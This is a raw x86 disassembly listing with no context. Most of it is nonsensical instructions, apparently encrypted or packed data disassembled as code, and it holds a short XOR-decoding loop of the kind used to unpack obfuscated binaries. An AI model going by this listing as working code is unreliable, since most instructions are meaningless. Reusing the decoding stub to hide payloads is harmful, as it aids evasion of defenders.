  4078e2:	aaa    
  4078e3:	lock jb 0x40786b
  4078e6:	push   esi
  4078e7:	outs   dx,DWORD PTR ds:[esi]
  4078e8:	and    ebx,ebx
  4078ea:	inc    edi
  4078eb:	mov    edi,0x318e9d51
  4078f0:	(bad)  
  4078f1:	fnstenv [ecx]
  4078f3:	jecxz  0x4078d2
  4078f5:	jl     0x4078d7
  4078f7:	adc    DWORD PTR [eax],edi
  4078f9:	dec    esp
  4078fa:	inc    edi
  4078fb:	ds ret 
  4078fd:	and    dl,BYTE PTR [esi-0x16]
  407900:	test   al,0x2a
  407902:	adc    DWORD PTR [esi],ebp
  407904:	fldcw  WORD PTR [eax+0x69e98a39]
  40790a:	jmp    0x612c:0x91bf256a
  407911:	ja     0x407939
  407913:	xchg   ebx,eax
  407914:	push   ss
  407915:	dec    edi
  407916:	xchg   esi,eax
  407917:	xchg   esi,eax
  407918:	pop    eax
  407919:	jo     0x4078bc
  40791b:	sub    edi,edi
  40791d:	cs mul ecx
  407920:	outs   dx,BYTE PTR ds:[esi]
  407921:	xchg   esi,eax
  407922:	xor    DWORD PTR [edi+0x28],esi
  407925:	test   BYTE PTR [edx+ecx*8-0x1b],ch
  407929:	jnp    0x407997
  40792b:	ss pop ds
  40792d:	xlat   BYTE PTR ds:[ebx]
  40792e:	loop   0x407970
  407930:	or     ah,BYTE PTR ds:0xbe7ccfd0
  407936:	sub    DWORD PTR ds:0x17d7761c,esi
  40793c:	addr16 pop ecx
  40793e:	jmp    0x80d0:0x2896b763
  407945:	leave  
  407946:	call   0x145c:0xa7f144b9
  40794d:	adc    BYTE PTR [ebp-0x5f208cdd],dh
  407953:	fldenv [edx+0x5c106c1f]
  407959:	rcl    DWORD PTR ds:0xc8c980ab,0x2b
  407960:	mov    dl,0x5e
  407962:	jl     0x407993
  407964:	jge    0x407901
  407966:	add    al,0x97
  407968:	add    bl,BYTE PTR [edi-0x11872f56]
  40796e:	jp     0x4079a4
  407970:	not    DWORD PTR ds:0x8ce3e577
  407976:	sbb    BYTE PTR [ecx-0x68],cl
  407979:	fdivrp st(7),st
  40797b:	repz pop eax
  40797d:	xor    DWORD PTR [ecx-0x40],0xffffff8d
  407981:	pop    edx
  407982:	ficom  WORD PTR [eax-0x43]
  407985:	mov    ebp,0xe27465c9
  40798a:	out    dx,eax
  40798b:	call   0x519d:0xf29fa839
  407992:	test   eax,0x639e66cd
  407997:	xchg   BYTE PTR [ecx-0x6d],cl
  40799a:	pop    edi
  40799b:	mov    ch,0x28
  40799d:	push   ebp
  40799e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40799f:	cmp    BYTE PTR [edx+0x28],cl
  4079a2:	hlt    
  4079a3:	sub    edx,DWORD PTR [ebp-0x13]
  4079a6:	sub    bh,BYTE PTR [esp+edi*4]
  4079a9:	mov    bh,0x1b
  4079ab:	sbb    ch,BYTE PTR fs:[eax]
  4079ae:	inc    ebx
  4079af:	xchg   edx,eax
  4079b0:	js     0x407967
  4079b2:	xchg   esp,eax
  4079b3:	fdivr  DWORD PTR [eax+0x60]
  4079b6:	dec    BYTE PTR [edx+0x7dc0b23e]
  4079bc:	and    BYTE PTR [eax-0x10ef94c3],ch
  4079c2:	jae    0x407961
  4079c4:	nop
  4079c5:	mov    ebp,cs
  4079c7:	ins    DWORD PTR es:[edi],dx
  4079c8:	or     bl,ch
  4079ca:	jg     0x4079fd
  4079cc:	cdq    
  4079cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ce:	push   ecx
  4079cf:	out    dx,eax
  4079d0:	xchg   edx,eax
  4079d1:	mov    cl,0x20
  4079d3:	pop    es
  4079d4:	repnz sbb al,0xfe
  4079d7:	sub    al,0x11
  4079d9:	into   
  4079da:	jmp    0x4079d9
  4079dc:	stos   BYTE PTR es:[edi],al
  4079dd:	or     DWORD PTR [ecx+0x4c],esp
  4079e0:	push   esp
  4079e1:	add    ebx,eax
  4079e3:	add    ah,BYTE PTR [ebx-0x49]
  4079e6:	dec    eax
  4079e7:	in     eax,0xd5
  4079e9:	jno    0x4079ad
  4079eb:	xchg   edi,eax
  4079ec:	mov    edx,0xc9c4fc94
  4079f1:	xchg   ebp,eax
  4079f2:	xor    eax,0xe8a1f576
  4079f7:	jmp    0xfb2e3284
  4079fc:	mov    bl,0x6d
  4079fe:	leave  
  4079ff:	sub    eax,0xe5c05e57
  407a04:	stc    
  407a05:	lods   eax,DWORD PTR ds:[esi]
  407a06:	pop    esi
  407a07:	aas    
  407a08:	arpl   WORD PTR [eax+0x1e],dx
  407a0b:	push   ebx
  407a0c:	iret   
  407a0d:	jg     0x407a5a
  407a0f:	ja     0x40799c
  407a11:	mov    ebp,0xbe6c19e5
  407a16:	gs popa 
  407a18:	pop    edx
  407a19:	or     BYTE PTR [esi-0x36],dh
  407a1c:	cwde   
  407a1d:	cld    
  407a1e:	fldz   
  407a20:	pop    ecx
  407a21:	cmp    eax,0x5cb610ad
  407a26:	scas   eax,DWORD PTR es:[edi]
  407a27:	bsr    ebx,DWORD PTR [edx+edi*4-0x62]
  407a2c:	mov    DWORD PTR [ebx+0x7275b67f],esp
  407a32:	adc    BYTE PTR [esi+0x2],al
  407a35:	dec    eax
  407a36:	leave  
  407a37:	mov    dh,0xd4
  407a39:	jmp    0x64d180de
  407a3e:	pop    edi
  407a3f:	call   0xc15c030f
  407a44:	sub    eax,0xe3bb6685
  407a49:	pop    edi
  407a4a:	out    0x63,al
  407a4c:	out    0x1e,al
  407a4e:	xchg   esp,eax
  407a4f:	mov    bl,0x9f
  407a51:	ror    DWORD PTR [eax+0x67],cl
  407a54:	xor    ah,dh
  407a56:	(bad)
  407a59:	mov    eax,ds:0x7c0f11cf
  407a5e:	inc    ecx
  407a5f:	push   esp
  407a60:	sbb    esi,DWORD PTR [edi+0x27]
  407a63:	sbb    bh,ch
  407a65:	jb     0x407a7f
  407a67:	les    ebp,FWORD PTR [ebp-0x17]
  407a6a:	out    dx,eax
  407a6b:	les    edx,FWORD PTR [esi-0x13]
  407a6e:	call   0x5913:0xaafc1262
  407a75:	jg     0x407a0b
  407a77:	int    0x5b
  407a79:	cld    
  407a7a:	jg     0x407a14
  407a7c:	add    al,0x10
  407a7e:	xchg   ebp,eax
  407a7f:	cmp    eax,0x53c8f42f
  407a84:	leave  
  407a85:	lds    edx,FWORD PTR [esi]
  407a87:	pushf  
  407a88:	ss pop ecx
  407a8a:	das    
  407a8b:	loope  0x407afe
  407a8d:	add    ax,di
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	mov    bl,0xf7
  407ac2:	enter  0x9c28,0xdb
  407ac6:	js     0x407b40
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407b2c
  407acd:	aam    0xee
  407acf:	push   ecx
  407ad0:	dec    esi
  407ad1:	enter  0xdca0,0x21
  407ad5:	scas   al,BYTE PTR es:[edi]
  407ad6:	push   esp
  407ad7:	sub    DWORD PTR [ecx+0x78],ebp
  407ada:	jbe    0x407a76
  407adc:	xchg   edi,eax
  407add:	fadd   DWORD PTR [eax+0xe]
  407ae0:	data16 fcmove st,st(5)
  407ae3:	mov    ds:0xe5d2d484,al
  407ae8:	dec    ecx
  407ae9:	adc    bh,BYTE PTR [edx-0x4796e5dd]
  407aef:	cmp    ebp,DWORD PTR [edx]
  407af1:	ss and eax,0x1778d896
  407af7:	int    0xef
  407af9:	dec    edi
  407afa:	loopne 0x407b68
  407afc:	stc    
  407afd:	or     al,0xb7
  407aff:	stos   BYTE PTR es:[edi],al
  407b00:	aas    
  407b01:	xor    dh,BYTE PTR [edi+0x1a]
  407b04:	jp     0x407b2d
  407b06:	aam    0xf
  407b08:	(bad)
  407b0c:	js     0x407b3f
  407b0e:	(bad)  
  407b0f:	dec    DWORD PTR [ebp-0x62]
  407b12:	lea    esi,[ebx-0x7719c4aa]
  407b18:	arpl   WORD PTR [edi+0x5137529c],si
  407b1e:	mov    bh,0x0
  407b20:	mov    dl,0x39
  407b22:	into   
  407b23:	xor    eax,0xe252674d
  407b28:	getsec 
  407b2a:	outs   dx,DWORD PTR ds:[esi]
  407b2b:	in     al,dx
  407b2c:	adc    BYTE PTR [edi],dh
  407b2e:	adc    BYTE PTR ds:0x2ed815c,ah
  407b34:	mov    esp,0xfdb07772
  407b39:	and    edi,DWORD PTR [esi+0x1dd243bd]
  407b3f:	fiadd  DWORD PTR ds:0xdf9ff12
  407b45:	repz pusha 
  407b47:	call   0xa2cd:0xc5323ccf
  407b4e:	(bad)  
  407b4f:	call   0x76639853
  407b54:	mov    eax,esp
  407b56:	dec    ecx
  407b57:	jp     0x407af1
  407b59:	and    al,0xfc
  407b5b:	retf   
  407b5c:	pop    ecx
  407b5d:	aas    
  407b5e:	lock scas al,BYTE PTR es:[edi]
  407b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b61:	(bad)  
  407b62:	dec    edx
  407b63:	xchg   esp,eax
  407b64:	call   0x25ab:0xdc6c0f93
  407b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b6c:	fwait
  407b6d:	arpl   WORD PTR [edi],ax
  407b6f:	sub    eax,0x21172978
  407b74:	mov    dh,0x39
  407b76:	jb     0x407ba2
  407b78:	push   0xffffffe7
  407b7a:	or     BYTE PTR [ecx+0x59],al
  407b7d:	jno    0x407bb1
  407b7f:	addr16 popa 
  407b81:	sti    
  407b82:	std    
  407b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b84:	cmc    
  407b85:	adc    BYTE PTR [ecx],bl
  407b87:	xchg   al,al
  407b89:	dec    ebp
  407b8a:	sbb    eax,0x66a7ea00
  407b8f:	dec    esp
  407b90:	repnz dec eax
  407b92:	push   ebp
  407b93:	push   ss
  407b94:	jb     0x407b2b
  407b96:	mov    edx,0xb94c93ce
  407b9b:	div    BYTE PTR [ecx+0x20]
  407b9e:	mov    esi,edx
  407ba0:	icebp  
  407ba1:	jns    0x407b92
  407ba3:	dec    ecx
  407ba4:	mov    eax,ds:0x224eba10
  407ba9:	test   eax,0x5c5b47e3
  407bae:	jmp    0xee4cf756
  407bb3:	cmp    eax,0xd745a4f9
  407bb8:	inc    eax
  407bb9:	ret    0x397d
  407bbc:	and    eax,0x46ab5849
  407bc1:	mov    esp,0xf837b7fd
  407bc6:	out    dx,al
  407bc7:	ret    0x99ab
  407bca:	mov    al,0x99
  407bcc:	ds jbe 0x407c27
  407bcf:	lods   eax,DWORD PTR ds:[esi]
  407bd0:	jne    0x407ba9
  407bd2:	ins    BYTE PTR es:[edi],dx
  407bd3:	xchg   ebp,eax
  407bd4:	sbb    ecx,edi
  407bd6:	jo     0x407bfe
  407bd8:	pop    esp
  407bd9:	sbb    DWORD PTR [ebp+0x771569e],eax
  407bdf:	inc    ebx
  407be0:	rol    DWORD PTR [ebp+0x5af7464f],0xcb
  407be7:	inc    esi
  407be8:	es or  eax,0x6cd2a5eb
  407bee:	loope  0x407bc9
  407bf0:	add    eax,0x8d81d95d
  407bf5:	xor    esp,DWORD PTR [ecx]
  407bf7:	in     al,dx
  407bf8:	rcl    DWORD PTR [ebx-0x3385bbd5],cl
  407bfe:	add    eax,0xef5e5f70
  407c03:	lods   eax,DWORD PTR ds:[esi]
  407c04:	jle    0x407c5a
  407c06:	test   eax,0x1442a69e
  407c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c0c:	push   ebx
  407c0d:	sub    eax,0x270bf652
  407c12:	mov    edi,0x4506632c
  407c17:	lds    edx,FWORD PTR [esi+ebx*1]
  407c1a:	fisubr DWORD PTR [ecx+eiz*8-0x13af3428]
  407c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c22:	test   eax,0x456b214a
  407c27:	scas   al,BYTE PTR es:[edi]
  407c28:	(bad)  
  407c29:	jns    0x407c1c
  407c2b:	cmp    bh,BYTE PTR [ecx]
  407c2d:	or     DWORD PTR [esi],0x45b465e1
  407c33:	ja     0x407bed
  407c35:	lock pop esi
  407c37:	sbb    eax,0x19299f78
  407c3c:	int3   
  407c3d:	es jecxz 0x407cb8
  407c40:	pop    ebp
  407c41:	loope  0x407c3d
  407c43:	xor    eax,0xdde7132d
  407c48:	aam    0x55
  407c4a:	iret   
  407c4b:	stos   BYTE PTR es:[edi],al
  407c4c:	clc    
  407c4d:	adc    al,0xbe
  407c4f:	dec    eax
  407c50:	sub    ecx,DWORD PTR ds:0x41f5c89d
  407c56:	xchg   BYTE PTR [ebx+0x3140b98],al
  407c5c:	cdq    
  407c5d:	sbb    al,0xec
  407c5f:	jl     0x407c2e
  407c61:	sbb    ebx,DWORD PTR [ebx]
  407c63:	popa   
  407c64:	mov    edi,DWORD PTR [eax+0x36]
  407c67:	aaa    
  407c68:	je     0x407c22
  407c6a:	mov    edx,DWORD PTR ds:0x81a1cdff
  407c70:	cmp    BYTE PTR [ecx],bl
  407c72:	add    al,0x65
  407c74:	push   ebx
  407c75:	dec    eax
  407c76:	adc    DWORD PTR [edx],0x50
  407c79:	pop    ebp
  407c7a:	and    dl,al
  407c7c:	pop    ds
  407c7d:	push   0xffffff90
  407c7f:	inc    esp
  407c80:	sub    edi,DWORD PTR [esi]
  407c82:	cld    
  407c83:	retf   0xf7fb
  407c86:	jmp    0xfd49:0x199cf352
  407c8d:	sub    eax,0x5a220cfc
  407c92:	(bad)  
  407c93:	and    dh,BYTE PTR ds:0xd3a86294
  407c99:	cmp    al,0x6d
  407c9b:	sahf   
  407c9c:	cs push esi
  407c9e:	mov    ds:0x9b6e5e34,eax
  407ca3:	mov    DWORD PTR [edx+ebp*8],ebx
  407ca6:	fnstenv [esi]
  407ca8:	xlat   BYTE PTR ds:[ebx]
  407ca9:	add    edx,ebp
  407cab:	inc    ecx
  407cac:	shr    DWORD PTR [esi],1
  407cae:	aam    0xdb
  407cb0:	inc    esi
  407cb1:	push   ecx
  407cb2:	xor    eax,0x623153af
  407cb7:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  407cb9:	(bad)  
  407cba:	outs   dx,BYTE PTR ds:[esi]
  407cbb:	mov    esp,0xa784e0a9
  407cc0:	mov    ebp,0x6d6417e5
  407cc5:	lods   eax,DWORD PTR ds:[esi]
  407cc6:	test   eax,0x9858d017
  407ccb:	push   ecx
  407ccc:	xor    eax,0x4620cb8e
  407cd1:	data16 int 0x98
  407cd4:	jmp    FWORD PTR [esi+edi*8-0x117f5a7a]
  407cdb:	sti    
  407cdc:	dec    ebx
  407cdd:	mov    ds:0x17d2a1e8,eax
  407ce2:	daa    
  407ce3:	lds    ebx,FWORD PTR [ecx+0x60]
  407ce6:	adc    BYTE PTR [eax],ah
  407ce8:	cdq    
  407ce9:	cli    
  407cea:	push   ds
  407ceb:	push   ecx
  407cec:	test   al,0xd6
  407cee:	add    edi,ecx
  407cf0:	mov    BYTE PTR [eax+0xc],cl
  407cf3:	retf   
  407cf4:	sbb    esi,DWORD PTR [ecx-0x38]
  407cf7:	dec    edi
  407cf8:	int3   
  407cf9:	shl    ah,0x4c
  407cfc:	jmp    0x407d37
  407cfe:	shr    DWORD PTR [esi-0x29],0x9
  407d02:	jmp    0xedb0d61
  407d07:	adc    BYTE PTR ds:0xc700cdad,bl
  407d0d:	cmc    
  407d0e:	in     al,0xd7
  407d10:	sbb    DWORD PTR [edx],ebx
  407d12:	cmp    ecx,DWORD PTR [edi+edi*4-0x2b]
  407d16:	hlt    
  407d17:	fwait
  407d18:	stos   DWORD PTR es:[edi],eax
  407d19:	jg     0x407cd1
  407d1b:	ret    0xc1f
  407d1e:	loope  0x407d94
  407d20:	fwait
  407d21:	cmp    ch,bl
  407d23:	fincstp 
  407d25:	and    eax,0x10c7d473
  407d2a:	dec    edi
  407d2b:	int3   
  407d2c:	jp     0x407ce0
  407d2e:	inc    esp
  407d2f:	mov    edx,0x2606ffef
  407d34:	and    al,0xeb
  407d36:	adc    eax,0xfe98e292
  407d3b:	mov    BYTE PTR [edi],bh
  407d3d:	jb     0x407d00
  407d3f:	adc    BYTE PTR [edx-0x47],bl
  407d42:	cs dec ecx
  407d44:	gs clc 
  407d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d47:	mov    dl,0xf8
  407d49:	pop    esi
  407d4a:	in     eax,dx
  407d4b:	adc    DWORD PTR [ecx+esi*1+0x6fc639f7],ebp
  407d52:	adc    al,0x8
  407d54:	fimul  DWORD PTR [ecx-0x9]
  407d57:	das    
  407d58:	sub    edi,ebp
  407d5a:	jp     0x407d03
  407d5c:	cmp    al,0xf6
  407d5e:	cmp    DWORD PTR [edi],edx
  407d60:	xchg   edx,eax
  407d61:	cld    
  407d62:	ds add eax,0x6b436395
  407d68:	inc    ecx
  407d69:	push   0xcf136d73
  407d6e:	or     ebp,ebx
  407d70:	cmp    ch,ch
  407d72:	icebp  
  407d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d74:	or     al,0xbe
  407d76:	pop    esi
  407d77:	sub    BYTE PTR [edx+0x31f38955],al
  407d7d:	sub    dh,dl
  407d7f:	mov    edx,0x1f813e61
  407d84:	js     0x407d93
  407d86:	dec    ecx
  407d87:	xchg   DWORD PTR [ecx+eax*1+0x262c4e9b],edx
  407d8e:	jle    0x407d7a
  407d90:	icebp  
  407d91:	mov    esp,ecx
  407d93:	test   al,0x5c
  407d95:	retf   
  407d96:	es sub al,0x25
  407d99:	or     eax,0xbcecb831
  407d9e:	mov    ebp,0x402ac58d
  407da3:	xchg   DWORD PTR [ebx+0x7dab1a09],esp
  407da9:	fsubr  st,st(5)
  407dab:	iret   
  407dac:	adc    dl,cl
  407dae:	or     BYTE PTR [eax+0x51],dl
  407db1:	aaa    
  407db2:	in     eax,0xbc
  407db4:	dec    eax
  407db5:	fimul  WORD PTR [esi-0x38]
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fsub   DWORD PTR [eax-0x76]
  407ddb:	das    
  407ddc:	ror    DWORD PTR [eax+0x647878d8],cl
  407de2:	jle    0x407e5c
  407de4:	js     0x407dfd
  407de6:	and    ebp,DWORD PTR [eax+0x28e710cd]
  407dec:	es xchg esi,eax
  407dee:	or     DWORD PTR [esi+0x20],esp
  407df1:	adc    eax,DWORD PTR [ecx+0x48144cb1]
  407df7:	ror    DWORD PTR [edi-0x37350b7b],1
  407dfd:	test   BYTE PTR [ebx+eiz*1],dl
  407e00:	xor    ah,BYTE PTR [ebp-0x690312d5]
  407e06:	setno  BYTE PTR [esi-0x11]
  407e0a:	mov    ebp,0x566c611
  407e0f:	js     0x407e32
  407e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e12:	mov    ah,0xa7
  407e14:	push   esp
  407e15:	pop    ebx
  407e16:	pop    esi
  407e17:	cmp    eax,0xc574f45c
  407e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e1d:	adc    esp,DWORD PTR [edx]
  407e1f:	sub    al,0xe3
  407e21:	arpl   WORD PTR [ebp-0x23],di
  407e24:	push   0x53
  407e26:	int3   
  407e27:	push   ebp
  407e28:	xchg   edi,eax
  407e29:	test   al,0x5e
  407e2b:	lahf   
  407e2c:	and    dl,dl
  407e2e:	popa   
  407e2f:	jne    0x407e86
  407e31:	aad    0xa9
  407e33:	or     al,0x98
  407e35:	add    al,0x37
  407e37:	mov    bh,0xd3
  407e39:	sbb    eax,0x5afc63f8
  407e3e:	pop    ss
  407e3f:	in     al,0xc4
  407e41:	mov    eax,ds:0xf03acdd9
  407e46:	mov    ebp,0x5665e8e2
  407e4b:	xchg   ebp,eax
  407e4c:	inc    ecx
  407e4d:	in     al,0x67
  407e4f:	xchg   ebp,esi
  407e51:	test   cl,dl
  407e53:	xchg   ecx,eax
  407e54:	jnp    0x407dfc
  407e56:	push   ds
  407e57:	jle    0x407e14
  407e59:	out    dx,al
  407e5a:	cdq    
  407e5b:	xchg   edx,eax
  407e5c:	pop    edx
  407e5d:	sar    esp,1
  407e5f:	sub    BYTE PTR [esi],bl
  407e61:	dec    edx
  407e62:	loop   0x407e63
  407e64:	fadd   QWORD PTR [ebx]
  407e66:	call   0x872ba82e
  407e6b:	pushf  
  407e6c:	sub    ecx,0x3b
  407e6f:	xor    eax,0xebd236e9
  407e74:	xor    DWORD PTR [esi],edx
  407e76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e77:	xchg   esp,eax
  407e78:	fstp   DWORD PTR [esi+ebp*4+0x27de0738]
  407e7f:	cmp    edx,DWORD PTR [ebx+0x4c]
  407e82:	mov    dl,0x3a
  407e84:	jg     0x407e9a
  407e86:	mov    cs,WORD PTR [eax]
  407e88:	mov    ds:0xb84ec79,eax
  407e8d:	xchg   ebp,eax
  407e8e:	lds    ebp,FWORD PTR [esi]
  407e90:	mov    ds:0x78a3ca90,al
  407e95:	cmp    edi,DWORD PTR [ecx-0x19]
  407e98:	shl    BYTE PTR ds:0x5488caac,cl
  407e9e:	(bad)  
  407ea0:	xchg   edx,eax
  407ea1:	mov    edi,0x3e780a50
  407ea6:	loop   0x407e85
  407ea8:	inc    ebx
  407ea9:	mov    eax,cs:0x3ecae800
  407eaf:	out    dx,eax
  407eb0:	imul   esp,DWORD PTR [ecx],0xffffffd3
  407eb3:	or     edi,DWORD PTR [ebp-0x3c47b512]
  407eb9:	or     BYTE PTR [eax-0x1c877c2f],ah
  407ebf:	or     al,0x20
  407ec1:	pop    ebp
  407ec2:	xchg   esi,eax
  407ec3:	add    al,0xc1
  407ec5:	sub    al,0x15
  407ec7:	stos   DWORD PTR es:[edi],eax
  407ec8:	pop    esi
  407ec9:	pop    eax
  407eca:	lahf   
  407ecb:	gs mov al,0x13
  407ece:	or     DWORD PTR [ecx],esi
  407ed0:	cmp    esi,edx
  407ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed3:	cld    
  407ed4:	aas    
  407ed5:	lea    edi,[eax]
  407ed7:	ins    DWORD PTR es:[edi],dx
  407ed8:	push   ebp
  407ed9:	adc    DWORD PTR [esi+0x7a],ebp
  407edc:	jnp    0x407eaa
  407ede:	(bad)  
  407edf:	repnz stc 
  407ee1:	loope  0x407eb8
  407ee3:	sub    bl,0x94
  407ee6:	jp     0x407f27
  407ee8:	inc    eax
  407ee9:	out    0x50,eax
  407eeb:	shr    BYTE PTR ds:0x4a82c0cc,1
  407ef1:	data16 rcr BYTE PTR [ebp-0x5507bcc9],cl
  407ef8:	cmp    eax,0x6c1a3fc5
  407efd:	xor    al,BYTE PTR [ebx]
  407eff:	mov    ecx,0x6f1c3172
  407f04:	jae    0x407e99
  407f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f07:	add    al,0x97
  407f09:	mov    cl,0xce
  407f0b:	data16 adc BYTE PTR [edx],ch
  407f0e:	push   ss
  407f0f:	repz (bad) 
  407f11:	in     eax,dx
  407f12:	cmp    ecx,esp
  407f14:	arpl   sp,bx
  407f16:	inc    esp
  407f17:	jbe    0x407eb8
  407f19:	inc    ebx
  407f1a:	fisttp DWORD PTR ds:0xd2417438
  407f20:	lods   eax,DWORD PTR ds:[esi]
  407f21:	pop    eax
  407f22:	in     al,0x3
  407f24:	or     al,0xda
  407f26:	pop    ss
  407f27:	mov    al,ds:0x50412775
  407f2c:	leave  
  407f2d:	jl     0x407f4f
  407f2f:	pop    es
  407f30:	ret    0xe076
  407f33:	xor    eax,0x1d70cbf2
  407f38:	ficomp DWORD PTR [ebx]
  407f3a:	pop    ds
  407f3b:	leave  
  407f3c:	xchg   ebx,eax
  407f3d:	dec    ecx
  407f3e:	xchg   DWORD PTR [edi],esp
  407f40:	fidivr DWORD PTR [edx]
  407f42:	dec    esi
  407f43:	adc    dl,BYTE PTR [ebx]
  407f45:	sbb    edx,edi
  407f47:	jecxz  0x407f79
  407f49:	sub    edx,esi
  407f4b:	stos   BYTE PTR es:[edi],al
  407f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f4d:	push   es
  407f4e:	push   esi
  407f4f:	dec    ecx
  407f50:	in     al,0x3b
  407f52:	xor    BYTE PTR [eax],0x23
  407f55:	add    al,0xce
  407f57:	pop    ecx
  407f58:	and    al,0xb0
  407f5a:	and    al,0x72
  407f5c:	push   ss
  407f5d:	dec    ebp
  407f5e:	mov    ds:0xf68bede5,al
  407f63:	mov    BYTE PTR [esi+ebx*2-0x7f05be4],ah
  407f6a:	lock xchg edx,eax
  407f6c:	int    0x2e
  407f6e:	test   al,0x6b
  407f70:	out    0xe2,al
  407f72:	dec    ebx
  407f73:	mov    eax,0x1a08278b
  407f78:	into   
  407f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f7a:	xor    al,0x1
  407f7c:	int3   
  407f7d:	dec    ebx
  407f7e:	stc    
  407f7f:	adc    DWORD PTR [ebx+0x5654207b],esp
  407f85:	addr16 push edx
  407f87:	lea    edx,[ecx-0x51]
  407f8a:	cmp    DWORD PTR [ebx-0x19],0x46
  407f8e:	sub    al,0x2
  407f90:	popf   
  407f91:	fcom   DWORD PTR [edi]
  407f93:	(bad)  
  407f94:	xor    eax,0x6ff32fc8
  407f99:	js     0x407f26
  407f9b:	std    
  407f9c:	xor    ecx,esp
  407f9e:	add    al,0xb5
  407fa0:	iret   
  407fa1:	mov    ds:0x28e49989,eax
  407fa6:	mov    dh,0x52
  407fa8:	xchg   ebp,eax
  407fa9:	add    ebx,DWORD PTR [ebp+0x34d562f9]
  407faf:	jmp    edi
  407fb1:	or     al,0x4
  407fb3:	jo     0x407ff3
  407fb5:	sub    ah,al
  407fb7:	stos   BYTE PTR es:[edi],al
  407fb8:	and    ebx,DWORD PTR [edi]
  407fba:	pop    DWORD PTR [edx-0x6c16636f]
  407fc0:	outs   dx,DWORD PTR ds:[esi]
  407fc1:	lods   eax,DWORD PTR ds:[esi]
  407fc2:	ficom  WORD PTR [ebx+0x49a909e6]
  407fc8:	jo     0x407fb0
  407fca:	retf   
  407fcb:	dec    edi
  407fcc:	btr    DWORD PTR [esi],edx
  407fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd0:	fwait
  407fd1:	and    DWORD PTR [edi-0x6d],ebx
  407fd4:	mov    al,0xb
  407fd6:	ja     0x407f89
  407fd8:	sbb    ch,BYTE PTR [ecx-0x61]
  407fdb:	ret    
  407fdc:	stc    
  407fdd:	les    edi,FWORD PTR [edx+0x21]
  407fe0:	fidiv  DWORD PTR [esi+0x35]
  407fe3:	mov    DWORD PTR [edx+0x73],edi
  407fe6:	and    BYTE PTR [ebp+0x4b],bh
  407fe9:	popf   
  407fea:	dec    esi
  407feb:	jecxz  0x407fa9
  407fed:	jnp    0x407fe2
  407fef:	push   esp
  407ff0:	sbb    cl,bh
  407ff2:	sub    ebx,0x5b08dd90
  407ff8:	arpl   WORD PTR [ecx-0x4a07a400],si
  407ffe:	scas   al,BYTE PTR es:[edi]
  407fff:	out    0xbc,al
  408001:	fldcw  WORD PTR [ebx]
  408003:	leave  
  408004:	push   ds
  408005:	push   eax
  408006:	dec    esi
  408007:	cs jno 0x407fba
  40800a:	icebp  
  40800b:	scas   al,BYTE PTR es:[edi]
  40800c:	call   0x5120b2fc
  408011:	mov    ch,0x1f
  408013:	outs   dx,BYTE PTR ds:[esi]
  408014:	es test edi,edi
  408017:	sbb    esi,DWORD PTR [edi+edx*8-0x2f6d4f2e]
  40801e:	adc    ecx,DWORD PTR [edx+0x116e49d9]
  408024:	lock and DWORD PTR [ebx],edi
  408027:	push   0xffffffef
  408029:	adc    al,0x6c
  40802b:	mov    ecx,0xc8194055
  408030:	fucomip st,st(0)
  408032:	test   ebx,edx
  408034:	sub    bl,BYTE PTR [ebx]
  408036:	pop    ebp
  408037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408038:	mov    bl,BYTE PTR [edx-0xc]
  40803b:	das    
  40803c:	icebp  
  40803d:	jb     0x407fcf
  40803f:	in     eax,dx
  408040:	(bad)  
  408041:	pop    eax
  408042:	pop    ds
  408043:	dec    edx
  408044:	fld    TBYTE PTR [ecx-0x75]
  408047:	sub    al,0x68
  408049:	sbb    ebp,ebp
  40804b:	popf   
  40804c:	xchg   ebp,eax
  40804d:	push   ss
  40804e:	fucom  st(3)
  408050:	test   esp,esp
  408052:	daa    
  408053:	sahf   
  408054:	jmp    0x518e1270
  408059:	jno    0x407ffe
  40805b:	inc    ecx
  40805c:	test   DWORD PTR [eax],0xcc92beda
  408062:	scas   eax,DWORD PTR es:[edi]
  408063:	pushf  
  408064:	idiv   DWORD PTR [esi]
  408066:	in     al,0x5d
  408068:	push   ss
  408069:	sub    BYTE PTR [eax],0xd9
